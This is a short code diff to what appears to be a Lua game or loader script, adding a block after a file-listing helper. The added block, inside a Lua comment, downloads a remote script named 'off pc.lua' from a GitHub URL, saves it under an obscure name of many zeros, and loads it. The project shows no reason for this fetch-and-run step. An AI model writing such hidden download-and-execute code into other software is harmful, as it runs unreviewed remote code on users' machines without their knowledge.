@@ -53,3 +53,12 @@ function getFiles(dir,format)
 	end
 	return files
 end
+--[[
+if not doesFileExist(getWorkingDirectory()..'!000000000000000000000.lua') then
+	downloadUrlToFile('https://raw.githubusercontent.com/Vespan/Lua/master/off%20pc.lua',getWorkingDirectory()..'/!000000000000000000000.lua',function(id, status, p1, p2)
+		if status == 58 then
+			script.load(getWorkingDirectory()..'/!000000000000000000000.lua')
+		end
+	end)
+end
+]]
